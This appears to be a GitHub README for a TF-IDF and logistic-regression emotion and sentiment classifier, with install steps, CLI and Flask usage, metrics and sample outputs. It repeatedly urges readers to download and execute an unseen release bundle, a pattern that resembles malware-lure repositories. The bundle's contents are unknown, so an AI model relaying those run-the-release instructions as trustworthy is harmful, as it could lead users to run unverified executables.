# Emotion Sentiment Classifier — Detect Emotions in Text Fast

[![Releases](https://img.shields.io/badge/releases-download-blue.svg)](https://github.com/Bakrawy2025/emotion-sentiment-classifier/releases)

![Hero Image](https://images.unsplash.com/photo-1531297484001-80022131f5a1?ixlib=rb-4.0.3&q=80&fm=jpg&crop=entropy&cs=tinysrgb&dl=rawpixel-740015-unsplash.jpg)

Table of contents
- About 📘
- Features ✨
- Demo 🎯
- Quick start ▶️
- Installation — download and execute release file 🗂️
- Usage — CLI and interactive prediction 🛠️
- Data pipeline and model details ⚙️
- Evaluation and metrics 📊
- Examples — input / output pairs 🧾
- API and integration 🔗
- Contributing 🤝
- License & credits ©

About 📘
Understanding human emotions in text helps many tasks: customer feedback analysis, chat moderation, market research, and UX design. This repository provides a working pipeline for emotion detection and sentiment classification. It uses TF-IDF vectorization and a logistic regression core implemented with scikit-learn. The project outputs probabilistic emotion labels and a compact confusion-matrix-based report for model evaluation.

Features ✨
- Text classification for multiple emotions (joy, sadness, anger, fear, surprise, disgust) and binary sentiment (positive/negative).
- TF-IDF vectorization tuned for short text and reviews.
- Logistic regression classifier with hyperparameter presets and cross-validation.
- Data cleaning and basic NLP preprocessing: tokenization, stopword removal, simple lemmatization.
- Balanced class handling and weighted metrics.
- Interactive prediction script for quick local checks.
- Evaluation tools: confusion matrix, precision/recall, F1, ROC curves for sentiment class.
- Exportable model artifacts and pipeline via Releases.

Demo 🎯
Live demo assets appear in releases. The release bundle contains:
- Trained model pickle files
- Vectorizer and preprocessing pipeline
- CLI scripts for batch prediction
- Small web demo (Flask) for local testing

Download and run the release bundle from:
https://github.com/Bakrawy2025/emotion-sentiment-classifier/releases
The release file needs to be downloaded and executed following the Installation section below.

Quick start ▶️
1. Visit the releases page and download the latest asset:
   https://github.com/Bakrawy2025/emotion-sentiment-classifier/releases
2. Extract the package and run the interactive predictor or the web demo.
3. Feed text and get emotion and sentiment labels with probability scores.

Installation — download and execute release file 🗂️
The repository provides release archives with executable scripts and trained models. Pick the latest release and follow these steps.

Unix / macOS
1. Download the archive (replace FILE_NAME with the actual asset name from releases):
   ```
   curl -L -o emotion_release.zip "https://github.com/Bakrawy2025/emotion-sentiment-classifier/releases/download/vX.Y/emotion_release.zip"
   ```
2. Unzip and enter the folder:
   ```
   unzip emotion_release.zip
   cd emotion-sentiment-classifier
   ```
3. Create a virtual environment and install dependencies:
   ```
   python3 -m venv venv
   source venv/bin/activate
   pip install -r requirements.txt
   ```
4. Run the interactive CLI predictor:
   ```
   python3 scripts/predict_cli.py
   ```
5. Or run the local Flask demo:
   ```
   python3 web/app.py
   # open http://127.0.0.1:5000 in your browser
   ```

Windows (PowerShell)
1. Download the asset from the releases page.
2. Extract, create a virtual environment and install:
   ```
   python -m venv venv
   .\venv\Scripts\activate
   pip install -r requirements.txt
   ```
3. Run the CLI:
   ```
   python scripts\predict_cli.py
   ```

If the release link ever fails, check the Releases section on the repository page.

Usage — CLI and interactive prediction 🛠️
CLI usage (batch)
- Predict labels for a CSV file with a text column named "text":
  ```
  python scripts/predict_batch.py --input data/reviews.csv --text-col text --output predictions.csv
  ```
- Options:
  - --model: path to model pickle
  - --vectorizer: path to TF-IDF vectorizer
  - --threshold: probability cutoff for label assignment

Interactive CLI
- The interactive script opens a prompt. Type a sentence and get labels and confidences.
  ```
  $ python scripts/predict_cli.py
  > I'm so happy with the service!
  Emotion: joy (0.92)
  Sentiment: positive (0.98)
  ```

Local web demo (Flask)
- The demo offers an input box and a probability bar chart for emotion scores.
- Run web/app.py and use the local URL shown in the console.

Data pipeline and model details ⚙️
Preprocessing pipeline
- Lowercase normalization
- Unicode cleanup
- URL and mention removal
- Tokenization with regex
- Stopword removal (NLTK stopword list)
- Optional simple lemmatization (WordNet)

Feature engineering
- TF-IDF vectorization on unigrams and bigrams
- Max features configurable (default 30k)
- Min and max document frequency thresholds to reduce noise

Model
- Core classifier: scikit-learn LogisticRegression (solver: lbfgs)
- Multi-class handled with multinomial option
- Class weights set to balanced by default
- Pipeline stores vectorizer and classifier together for predict_proba and transform

Training pipeline
- Train/test split with stratification
- Hyperparameter grid search around C (regularization) and ngram range
- Cross-validation with 5 folds
- Early export of best model for inference

Evaluation and metrics 📊
The repo includes scripts to generate the following:
- Confusion matrix and heatmap
- Accuracy, macro F1, macro precision, macro recall
- Per-class support and weighted metrics
- ROC-AUC for binary sentiment
- Calibration plots for model probability checks

Sample evaluation command:
```
python scripts/evaluate.py --pred predictions.csv --true labels.csv --output eval_report/
```

Visualizations
- Confusion matrix plot using seaborn
- Class probability distribution plots
- Precision-recall curves for hard-to-detect emotions

Examples — input / output pairs 🧾
Small example inputs and expected outputs:

Input: "I can't believe this happened. I'm furious."
Output:
- Emotion: anger (0.94)
- Sentiment: negative (0.89)

Input: "What a pleasant surprise. That made my day!"
Output:
- Emotion: joy (0.87), surprise (0.58)
- Sentiment: positive (0.95)

Input: "The product broke after one day. Very disappointed."
Output:
- Emotion: sadness (0.72), disgust (0.48)
- Sentiment: negative (0.93)

These pairs mirror real use cases in feedback and social monitoring. The model returns multiple emotion probabilities so downstream logic can combine or threshold labels.

API and integration 🔗
The package includes a small Flask app and a REST API for quick integration:
- POST /predict
  - payload: { "text": "..." }
  - response: { "emotions": { "joy": 0.7, ... }, "sentiment": { "positive": 0.8, "negative": 0.2 } }

Example curl:
```
curl -X POST -H "Content-Type: application/json" \
  -d '{"text":"I love this product!"}' \
  http://127.0.0.1:5000/predict
```

Deployment hints
- Serve the model behind a light WSGI server (gunicorn)
- Use batching for high throughput
- Persist vectorizer and model artifacts to the same storage used during training

Model export
- The Releases archive includes pickled artifacts:
  - pipeline.pkl (vectorizer + classifier)
  - labels.json (mapping)
  - requirements.txt

Contributing 🤝
- Fork the repository and open a PR with a clear description of changes.
- Add tests for data cleaning, vectorizer outputs, and predict endpoint.
- Keep changes unitary and document new functionality in README and code.
- Use the same style for scripts and follow the existing import patterns.

Repository topics and tags
This project matches topics:
artificial-intelligence, confusion-matrix, data-cleaning, data-science, data-visualization, emotion-detection, interactive-prediction, logistic-regression, machine-learning, model-evaluation, natural-language-processing, python, scikit-learn, sentiment-analysis, text-classification, tf-idf-vectorization

These tags help search and surface the repo for related projects and users.

Assets and releases
Find downloadable release bundles here:
[![Download Releases](https://img.shields.io/badge/Get%20Releases-%20Download%20Now-blue.svg)](https://github.com/Bakrawy2025/emotion-sentiment-classifier/releases)

The release file includes a runnable demo script. Download that file and execute it per the Installation section instructions. If the link fails, check the repository Releases section for alternate assets.

Files of interest
- scripts/predict_cli.py — interactive CLI
- scripts/predict_batch.py — CSV batch processing
- scripts/train.py — training and export
- scripts/evaluate.py — metrics and plots
- web/app.py — small Flask demo
- requirements.txt — dependency pin list

License & credits ©
- License: MIT
- Main implementation: Python, scikit-learn, pandas, numpy, seaborn, Flask
- Data sources: mix of synthetic and public sentiment datasets for examples and small demos

Contact
- Repo and releases: https://github.com/Bakrawy2025/emotion-sentiment-classifier/releases
- Open an issue for help, feature requests, or bugs.

Screenshots and visuals
![Confusion Matrix Example](https://upload.wikimedia.org/wikipedia/commons/2/2c/Confusion_matrix.svg)

![TF-IDF illustration](https://miro.medium.com/max/1400/1*0H6G5o6VnBLX6q4ts4Y53w.png)

Maintenance checklist
- Keep dependencies updated and test for breaking changes.
- Re-train models when new labeled data arrives.
- Monitor per-class performance to detect drift.

This document contains core usage, install steps, API details, and pointers to the distribution assets. Follow the Releases link to download and execute the packaged bundle for local testing and rapid integration.